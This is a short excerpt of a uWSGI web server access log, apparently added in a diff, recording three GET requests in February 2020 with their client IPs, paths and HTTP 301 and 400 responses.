+[pid: 1769|app: 0|req: 70/120] 101.91.60.11 () {36 vars in 551 bytes} [Fri Feb  7 13:43:02 2020] GET /login => generated 0 bytes in 2 msecs (HTTP/1.1 301) 3 headers in 112 bytes (1 switches on core 0)
+[pid: 1769|app: 0|req: 71/121] 106.15.76.92 () {26 vars in 268 bytes} [Fri Feb  7 14:21:42 2020] GET / => generated 26 bytes in 11 msecs (HTTP/1.0 400) 1 headers in 53 bytes (1 switches on core 1)
+[pid: 1770|app: 0|req: 12/122] 120.78.231.236 () {26 vars in 270 bytes} [Fri Feb  7 14:22:46 2020] GET / => generated 26 bytes in 52 msecs (HTTP/1.0 400) 1 headers in 53 bytes (1 switches on core 1)
